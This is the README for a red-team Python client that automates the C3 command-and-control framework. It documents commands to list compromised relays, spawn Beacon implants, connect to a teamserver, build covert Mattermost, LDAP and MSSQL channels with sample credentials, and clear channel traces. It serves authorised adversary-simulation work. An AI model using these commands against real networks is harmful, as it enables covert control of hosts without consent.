# F-Secure's C3 Client script

This is a simple [F-Secure's C3](https://github.com/FSecureLABS/C3) client Python script offering a few functions to interact with C3 framework in an automated manner.

It connects to the C3 WebController (typically the one that's listening on port _52935_) and allows to issue API requests automating few things for us.

**Word of caution**: 

The script may be unstable as its not that yet thoroughly tested. Consider adding `--dry-run` flag before using it to simulate HTTP POST requests instead of sending them to make sure it'll work as expected. 

Also, some commands offer Agent filter criteria such as `--gateway-id`, `--relay-id` or `--channel-id` options. Use them to limit scope of this script's actions towards specific set of devices (Gateways, Relay, channels, etc). Otherwise the script picks broad range of nodes to commander. When for instance no filter criteria are given, all of the found channels/relays/gateways will receive commands.


## Usage

The script offers subcommands-kind of CLI interface, so after every command one can issue `--help` to get subcommand's help message.


### General help:

```
PS> py .\c3-client.py --help

    :: F-Secure's C3 Client - a lightweight automated companion with C3 voyages
    Mariusz Banach / mgeeky, <mb@binary-offensive.com>

usage:
Usage: ./c3-client.py [options] <host> <command> [...]

positional arguments:
  host                  C3 Web API host:port
  {alarm,download,list,get,ping,jitter,spawn,connector,close,channel}
                        command help
    alarm               Alarm options
    download            Download options
    list                List options
    get                 Get options
    ping                Ping Relays
    jitter              Set Update Jitter on a channel
    spawn               Spawn implant options
    connector           Connector options
    close               Close command.
    channel             Send Channel-specific command

optional arguments:
  -h, --help            show this help message and exit
  -v, --verbose         Display verbose output.
  -d, --debug           Display debug output.
  -f {json,text}, --format {json,text}
                        Output format. Can be JSON or text (default).
  -n, --dry-run         Do not send any HTTP POST request that could introduce changes in C3 network.
  -A user:pass, --httpauth user:pass
                        HTTP Basic Authentication (user:pass)
```

### Example of a sub-help

```
PS D:\> py c3-client.py http://192.168.0.200:52935 alarm relay --help

    :: F-Secure's C3 Client - a lightweight automated companion with C3 voyages
    Mariusz Banach / mgeeky, <mb@binary-offensive.com>

usage: Usage: ./c3-client.py [options] <host> <command> [...] alarm relay [-h] [-e EXECUTE] [-x WEBHOOK] [-g gateway_id]

optional arguments:
  -h, --help            show this help message and exit
  -e EXECUTE, --execute EXECUTE
                        If new Relay checks in - execute this command. Use following placeholders in your command: <computerName>, <userName>,
                        <domain>, <isElevated>, <osVersion>, <processId>, <relayName>, <relayId>, <buildId>, <timestamp> to customize executed
                        command's parameters. Example: powershell -c "Add-Type -AssemblyName System.Speech; $synth = New-Object -TypeName
                        System.Speech.Synthesis.SpeechSynthesizer; $synth.Speak('New Relay just checked-in
                        <domain>/<userName>@<computerName>')"
  -x WEBHOOK, --webhook WEBHOOK
                        Trigger a Webhook (HTTP POST request) to this URL whenever a new Relay checks-in. The request will contain JSON message
                        with all the fields available, mentioned in --execute option.
  -g gateway_id, --gateway-id gateway_id
                        ID (or Name) of the Gateway which Relays should be returned. If not given, will result all relays from all gateways.
```

Currently, following commands are supported:

- `list`
    - `gateways` - list gateways in either JSON or text format
    - `relays` - list relays in either JSON or text format

- `get`
    - `gateway` - get gateway details in text or JSON format
    - `relay` - get relay details in text or JSON format

- `alarm`
    - `relay` - trigger an alarm whenever a new Relay checks-in on a gateway

- `connector` 
    - `turnon`
        - `teamserver` - allows to establish connection with a Teamserver
    - `turnoff` - closes connection with Connector specified by connector_id

- `close`
    - `network` - sends `ClearNetwork` command to specified Gateway
    - `channel` - closes selected channel
    - `relay` - closes selected Relay(s) and all its bound peripherals, channels and Gateway-Return Channel

- `download`
    - `gateway` - downloads gateway executable

- `ping` - ping selected Relays

- `jitter` - sets jitter on specified channel(s)

- `channel` - channel-specific commands
    - `all`
        - `clear` - Clear message queue of every supported channel at once
    - `mattermost`
        - `create`- Creates a Mattermost Negotiation channel
        - `clear` - Clear Mattermost's channel messages to improve bandwidth
    - `ldap`
        - `create` - Creates a LDAP Negotiation Channel
        - `clear` - Clear LDAP attribute to improve bandwidth
    - `mssql`
        - `create` - Creates a MSSQL Negotiation Channel
        - `clear` - Clear DB Table entries to improve bandwidth
    - `uncsharefile`
        - `create` - Creates UncShareFile Negotiation Channel
        - `clear` - Remove all message files to improve bandwidth
    - `dropbox`
        - `clear` - Remove All Files to improve bandwidth
    - `github`
        - `clear` - Remove All Files to improve bandwidth
    - `googledrive`
        - `clear` - Remove All Files to improve bandwidth

- `spawn` - adds peripheral / spawns implant on Relay
    - `beacon` - Adds peripheral Beacon or in other words spawns new Beacon on Relay


## Example Usage

### Example 1

This example shows how to keep all of your Relays pinged every 45 seconds:

```
PS D:\> py c3-client.py http://192.168.0.200:52935 ping -k 45

    :: F-Secure's C3 Client - a lightweight automated companion with C3 voyages
    Mariusz Banach / mgeeky, <mb@binary-offensive.com>

[.] Sending a ping every 45 seconds.
[.] Pinged relay: matter4    from gateway  gate4
[.] Pinged relay: mssql1     from gateway  gate4
[.] Pinged relay: ldap9      from gateway  gate4
[.] Pinged relay: mssql1     from gateway  gate4
[+] Pinged 4 active relays.

[.] Sending a ping every 45 seconds.
[.] Pinged relay: matter4    from gateway  gate4
[.] Pinged relay: mssql1     from gateway  gate4
[.] Pinged relay: ldap9      from gateway  gate4
[.] Pinged relay: mssql1     from gateway  gate4
[+] Pinged 4 active relays.

```

### Example 2

Ever suffered from a poor C3 bandwidth or general performance? Worry not - you can easily clear/remove message queues from all of your channels with this simple trick:

```
PS D:\> py .\c3-client.py http://192.168.0.200:52935 channel all clear

    :: C3 Client - a lightweight automated companion with C3 voyages
    Mariusz Banach / mgeeky, <mb@binary-offensive.com>

[.] LDAP: Clearing messages queue...
[+] Cleared LDAP attribute value on C3 channel 3 on Relay matter4 on gateway gate4
[+] Cleared LDAP attribute value on C3 channel 8001 on Relay matter4 on gateway gate4
[+] Cleared LDAP attribute value on C3 channel 8000 on Relay ldap9 on gateway gate4

[.] MSSQL: Clearing messages queue...
[+] Cleared MSSQL Table on C3 channel 4 on Relay matter4 on gateway gate4
[+] Cleared MSSQL Table on C3 channel 8002 on Relay matter4 on gateway gate4
[+] Cleared MSSQL Table on C3 channel 8003 on Relay matter4 on gateway gate4
[+] Cleared MSSQL Table on C3 channel 8000 on Relay mssql1 on gateway gate4
[+] Cleared MSSQL Table on C3 channel 8000 on Relay mssql1 on gateway gate4

[.] Mattermost: Clearing messages queue...
[+] Purged all messages from Mattermost C3 channel 8000 on Relay matter4 on gateway gate4
[+] Purged all messages from Mattermost C3 channel 8000 on Relay matter4 on gateway gate4
[+] Purged all messages from Mattermost C3 channel 1 on gateway gate4
[+] Purged all messages from Mattermost C3 channel 4 on gateway gate4
[+] Purged all messages from Mattermost C3 channel 14 on gateway gate4

[.] GoogleDrive: Clearing messages queue...
[-] No channels could be found to receive GoogleDrive remove all message files command.

[.] Github: Clearing messages queue...
[-] No channels could be found to receive Github remove all message files command.

[.] Dropbox: Clearing messages queue...
[-] No channels could be found to receive Dropbox remove all message files command.

[.] UncShareFile: Clearing messages queue...
[-] No channels could be found to receive UncShareFile remove all message files command.

```

### Example 3

In this example setup an alarm that triggers upon new Relay checking-in. Whenever that happens, a command is executed with placeholders that will be substituted with values extracted from Relay's metadata:

```
PS D:\> py c3-client.py http://192.168.0.200:52935 alarm relay -g gate4 --execute "powershell -file speak.ps1 -message \`"New C3 Relay Inbound: <domain>/<userName>, computer: <computerName>\`""

    :: F-Secure's C3 Client - a lightweight automated companion with C3 voyages
    Mariusz Banach / mgeeky, <mb@binary-offensive.com>

[.] Entering infinite-loop awaiting for new Relays...
[+] New Relay checked-in!
    Relay 5:              matter4
        Relay ID:         70a6f7c456f049c8
        Build ID:         795f
        Is active:        True                  (+)
        Timestamp:        2021-03-24 04:14:34
        Host Info:
            Computer:     JUMPBOX
            Domain:       CONTOSO
            User Name:    alice
            Is elevated:  False
            OS Version:   Windows 10.0 Server SP: 0.0 Build 14393
            Process ID:   4092

    Channels:
        Gateway Return Channel (GRC) 1:
            Jitter:      3.5 ... 6.5
            Properties:
                Name:    Output ID
                Value:   3UM2G2TW

                Name:    Input ID
                Value:   fftuO5py

                Name:    Mattermost Server URL
                Value:   http://192.168.0.210:8080

                Name:    Mattermost Team Name
                Value:   foobar

                Name:    Mattermost Access Token
                Value:   c3g7sokucbgidgxxxxxxxxxx

                Name:    Channel name
                Value:   x26vg0

                Name:    User-Agent Header
                Value:   Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)

[.] Executing command: powershell -file speak.ps1 -message "New C3 Relay Inbound: CONTOSO/alice, computer: JUMPBOX"

```

## Other notable use-cases


### 1. Download gateway

```
py c3-client.py -v http://192.168.0.200:52935 download gateway c:\output\directory -G gate6 -O 192.168.0.200 -x
```

### 2. Connect to Teamserver

```
py c3-client.py -v http://192.168.0.200:52935 connector gate5 turnon teamserver 192.168.0.200 2223
```

### 3. Setup Mattermost channel

```
py c3-client.py -v http://192.168.0.200:52935 channel mattermost create gate5 http://192.168.0.210:8080 foobar c3g7sokucbgidgxxxxxxxxxx
```

### 4. Setup MSSQL channel

```
py c3-client.py -v http://192.168.0.200:52935 channel mssql create matter6 mssql-server.contoso.com master spt_foobar contoso\alice Password1! true
```

### 5. Setup LDAP channel

```
py c3-client.py -v http://192.168.0.200:52935 channel ldap create matter5 dc1.contoso.com alice@CONTOSO.COM Password1! CN=alice,CN=Users,DC=contoso,DC=com
```

### 6. Spawn Beacon

```
py c3-client.py -v http://192.168.0.200:52935 spawn beacon matter5
```

### 7. Clear all channels

```
py c3-client.py http://192.168.0.200:52935 channel all clear
```

### 8. Clear network

```
py c3-client.py http://192.168.0.200:52935 close network gate5
```

### 9. Alarm

```
py c3-client.py http://192.168.0.200:52935 alarm relay -g gate5 --execute "powershell -file speak.ps1 -message \`"New C3 Relay inbound: <domain>/<userName>, computer: <computerName>\`"" --execute "cmd /c new-relay.bat <relayId>"
```

### 10. Ping Relays

```
py c3-client.py http://192.168.0.200:52935 ping -k 45
```

## Author

```
Mariusz Banach / mgeeky, '21
<mb [at] binary-offensive.com>
```
